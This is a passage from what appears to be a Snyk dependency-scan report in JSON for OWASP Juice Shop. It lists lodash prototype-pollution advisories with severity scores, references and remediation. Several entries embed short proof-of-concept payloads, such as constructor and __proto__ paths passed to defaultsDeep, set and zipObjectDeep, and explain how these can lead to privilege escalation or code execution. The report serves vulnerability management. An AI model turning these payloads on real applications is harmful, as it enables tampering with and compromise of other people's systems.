        "alternativeIds": [],
        "disclosureTime": "2020-11-17T13:02:10Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2021-02-15T11:50:50Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-05-30T09:23:01.108804Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "sanitize-html@1.4.2",
          "lodash@2.4.2"
        ],
        "upgradePath": [
          false,
          "sanitize-html@1.7.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "lodash",
        "version": "2.4.2"
      },
      {
        "id": "SNYK-JS-LODASH-450202",
        "title": "Prototype Pollution",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C",
        "credit": [
          "Snyk Security Team"
        ],
        "semver": {
          "vulnerable": [
            "<4.17.12"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "4.17.12"
        ],
        "patches": [
          {
            "id": "patch:SNYK-JS-LODASH-450202:0",
            "urls": [
              "https://snyk-patches.s3.amazonaws.com/npm/lodash/20190702/lodash_20190702_0_0_1f8ea07746963a535385a5befc19fa687a627d2b.patch"
            ],
            "version": "=4.17.11",
            "comments": [],
            "modificationTime": "2019-12-03T11:40:45.719849Z"
          }
        ],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.3,
        "functions": [
          {
            "version": [
              ">=4.17.3 <4.17.12"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "className": null,
              "functionName": "runInContext.customDefaultsMerge"
            }
          }
        ],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "lodash",
        "references": [
          {
            "url": "https://github.com/lodash/lodash/issues/4348",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/lodash/lodash/pull/4336",
            "title": "GitHub PR"
          },
          {
            "url": "https://github.com/lodash/lodash/pull/4355",
            "title": "GitHub PR"
          },
          {
            "url": "https://github.com/sailshq/lodash/pull/1",
            "title": "GitHub PR"
          },
          {
            "url": "https://www.npmjs.com/advisories/1065",
            "title": "Node Security Advisory"
          },
          {
            "url": "https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/",
            "title": "Snyk Blog"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H",
            "cvssV3BaseScore": 9.1,
            "modificationTime": "2024-03-11T09:47:27.477228Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H",
            "cvssV3BaseScore": 9.1,
            "modificationTime": "2024-03-11T09:50:03.334789Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-07-09T12:47:50.137510Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H",
            "assigner": "NVD",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:47:27.477228Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H",
            "assigner": "Red Hat",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.0",
            "modificationTime": "2024-03-11T09:50:03.334789Z"
          }
        ],
        "description": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The function `defaultsDeep` could be tricked into adding or modifying properties of `Object.prototype` using a `constructor` payload.\r\n\r\n## PoC by Snyk\r\n```\r\nconst mergeFn = require('lodash').defaultsDeep;\r\nconst payload = '{\"constructor\": {\"prototype\": {\"a0\": true}}}'\r\n\r\nfunction check() {\r\n    mergeFn({}, JSON.parse(payload));\r\n    if (({})[`a0`] === true) {\r\n        console.log(`Vulnerable to Prototype Pollution via ${payload}`);\r\n    }\r\n  }\r\n\r\ncheck();\r\n```\r\n\r\nFor more information, check out our [blog post](https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/)\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `lodash` to version 4.17.12 or higher.\n## References\n- [GitHub Issue](https://github.com/lodash/lodash/issues/4348)\n- [GitHub PR](https://github.com/lodash/lodash/pull/4336)\n- [GitHub PR](https://github.com/lodash/lodash/pull/4355)\n- [GitHub PR](https://github.com/sailshq/lodash/pull/1)\n- [Node Security Advisory](https://www.npmjs.com/advisories/1065)\n- [Snyk Blog](https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/)\n",
        "epssDetails": {
          "percentile": "0.78085",
          "probability": "0.01176",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2019-10744"
          ],
          "CWE": [
            "CWE-1321"
          ],
          "NSP": [
            "1065"
          ],
          "GHSA": [
            "GHSA-jf85-cpcp-j695"
          ]
        },
        "packageName": "lodash",
        "proprietary": true,
        "creationTime": "2019-06-19T12:04:21.040000Z",
        "functions_new": [
          {
            "version": [
              ">=4.17.3 <4.17.12"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "functionName": "runInContext.customDefaultsMerge"
            }
          }
        ],
        "alternativeIds": [],
        "disclosureTime": "2019-06-19T11:45:02Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2019-07-02T11:45:01Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-07-09T12:47:50.137510Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "sanitize-html@1.4.2",
          "lodash@2.4.2"
        ],
        "upgradePath": [
          false,
          "sanitize-html@1.7.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "lodash",
        "version": "2.4.2"
      },
      {
        "id": "SNYK-JS-LODASH-608086",
        "title": "Prototype Pollution",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C",
        "credit": [
          "awarau"
        ],
        "semver": {
          "vulnerable": [
            "<4.17.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "4.17.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "lodash",
        "references": [
          {
            "url": "https://hackerone.com/reports/864701",
            "title": "HackerOne Report"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-04-15T16:31:58.604260Z"
          }
        ],
        "description": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `set` and `setwith` functions due to improper user input sanitization.\n## PoC\n```js\r\nlod = require('lodash')\r\nlod.set({}, \"__proto__[test2]\", \"456\")\r\nconsole.log(Object.prototype)\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `lodash` to version 4.17.17 or higher.\n## References\n- [HackerOne Report](https://hackerone.com/reports/864701)\n",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-1321"
          ]
        },
        "packageName": "lodash",
        "proprietary": false,
        "creationTime": "2020-08-21T12:52:58.443440Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2020-08-21T10:34:29Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2020-08-21T12:53:03Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-04-15T16:31:58.604260Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "sanitize-html@1.4.2",
          "lodash@2.4.2"
        ],
        "upgradePath": [
          false,
          "sanitize-html@1.7.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "lodash",
        "version": "2.4.2"
      },
      {
        "id": "SNYK-JS-LODASH-6139239",
        "title": "Prototype Pollution",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "Timothee Desurmont"
        ],
        "semver": {
          "vulnerable": [
            "<4.17.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "4.17.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "lodash",
        "references": [
          {
            "url": "https://gist.github.com/Sampaguitas/a316bced4fdd501146b07997d1d04eb2",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/lodash/lodash/blob/aaa111912cb05e6f0f9f23d1eb8a41ccfcf9c2c2/lodash.zipobjectdeep/index.js%23L738",
            "title": "Vulnerable Code"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-04-22T04:02:54.827871Z"
          }
        ],
        "description": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Prototype Pollution through the `zipObjectDeep` function due to improper user input sanitization in the `baseZipObject` function.\n## PoC\n**lodash.zipobjectdeep:**\r\n\r\n```js\r\nconst zipObjectDeep = require(\"lodash.zipobjectdeep\");\r\n\r\nlet emptyObject = {};\r\n\r\n\r\nconsole.log(`[+] Before prototype pollution : ${emptyObject.polluted}`);\r\n//[+] Before prototype pollution : undefined\r\n\r\nzipObjectDeep([\"constructor.prototype.polluted\"], [true]);\r\n//we inject our malicious attributes in the vulnerable function\r\n\r\nconsole.log(`[+] After prototype pollution : ${emptyObject.polluted}`);\r\n//[+] After prototype pollution : true\r\n```\r\n\r\n**lodash:**\r\n\r\n```js\r\nconst test = require(\"lodash\");\r\n\r\nlet emptyObject = {};\r\n\r\n\r\nconsole.log(`[+] Before prototype pollution : ${emptyObject.polluted}`);\r\n//[+] Before prototype pollution : undefined\r\n\r\ntest.zipObjectDeep([\"constructor.prototype.polluted\"], [true]);\r\n//we inject our malicious attributes in the vulnerable function\r\n\r\nconsole.log(`[+] After prototype pollution : ${emptyObject.polluted}`);\r\n//[+] After prototype pollution : true\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `lodash` to version 4.17.17 or higher.\n## References\n- [GitHub Gist](https://gist.github.com/Sampaguitas/a316bced4fdd501146b07997d1d04eb2)\n- [Vulnerable Code](https://github.com/lodash/lodash/blob/aaa111912cb05e6f0f9f23d1eb8a41ccfcf9c2c2/lodash.zipobjectdeep/index.js#L738)\n",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-1321"
          ]
        },
        "packageName": "lodash",
        "proprietary": true,
        "creationTime": "2023-12-24T16:03:36.521527Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-12-23T22:00:00Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-04-15T13:48:35.040881Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-04-22T04:02:54.827871Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "sanitize-html@1.4.2",
          "lodash@2.4.2"
        ],
        "upgradePath": [
          false,
          "sanitize-html@1.7.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "lodash",
        "version": "2.4.2"
      },
      {
        "id": "SNYK-JS-LODASH-73638",
        "title": "Prototype Pollution",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P",
        "credit": [
          "asgerf"
        ],
        "semver": {
          "vulnerable": [
            "<4.17.11"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "4.17.11"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.3,
        "functions": [
          {
            "version": [
              ">=4.17.5 <4.17.11"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "className": null,
              "functionName": "safeGet"
            }
          },
          {
            "version": [
              ">=4.0.0 <4.17.5"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "className": null,
              "functionName": "runInContext.baseMerge"
            }
          },
          {
            "version": [
              ">=4.0.0 <4.17.5"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "className": null,
              "functionName": "runInContext.baseMergeDeep"
            }
          },
          {
            "version": [
              ">=4.0.0 <4.17.5"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "className": null,
              "functionName": "runInContext.assignMergeValue"
            }
          },
          {
            "version": [
              ">=3.0.0 <4.0.0"
            ],
            "functionId": {
              "filePath": "index.js",
              "className": null,
              "functionName": "runInContext.baseMerge"
            }
          },
          {
            "version": [
              ">=3.0.0 <4.0.0"
            ],
            "functionId": {
              "filePath": "index.js",
              "className": null,
              "functionName": "runInContext.baseMergeDeep"
            }
          },
          {
            "version": [
              ">=4.0.0 <4.17.3"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "className": null,
              "functionName": "runInContext.mergeDefaults"
            }
          },
          {
            "version": [
              ">=2.0.0 <3.0.0"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "className": null,
              "functionName": "runInContext.merge"
            }
          },
          {
            "version": [
              ">=0.9.0 <1.0.0"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "className": null,
              "functionName": "merge"
            }
          },
          {
            "version": [
              ">=1.0.0 <1.0.3"
            ],
            "functionId": {
              "filePath": "dist/lodash.js",
              "className": null,
              "functionName": "merge"
            }
          },
          {
            "version": [
              ">=1.1.0 <2.0.0"
            ],
            "functionId": {
              "filePath": "dist/lodash.js",
              "className": null,
              "functionName": "runInContext.merge"
            }
          }
        ],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "lodash",
        "references": [
          {
            "url": "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/lodash/lodash/pull/4337",
            "title": "GitHub PR"
          },
          {
            "url": "https://www.npmjs.com/advisories/1066",
            "title": "NPM Security Advisory"
          },
          {
            "url": "https://www.npmjs.com/advisories/1068",
            "title": "NPM Security Advisory"
          },
          {
            "url": "https://www.npmjs.com/advisories/1071",
            "title": "NPM Security Advisory"
          },
          {
            "url": "https://www.npmjs.com/advisories/782",
            "title": "NPM Security Advisory"
          },
          {
            "url": "https://hackerone.com/reports/380873",
            "title": "POC: HackerOne Report"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "cvssV3BaseScore": 5.6,
            "modificationTime": "2024-03-11T09:47:55.973142Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "cvssV3BaseScore": 5.6,
            "modificationTime": "2024-03-11T09:53:47.287334Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-07-09T12:48:35.271273Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 5.6,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:47:55.973142Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 5.6,
            "cvssVersion": "3.0",
            "modificationTime": "2024-03-11T09:53:47.287334Z"
          }
        ],
        "description": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The functions `merge`, `mergeWith`, and `defaultsDeep` could be tricked into adding or modifying properties of `Object.prototype`. This is due to an incomplete fix to `CVE-2018-3721`.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: 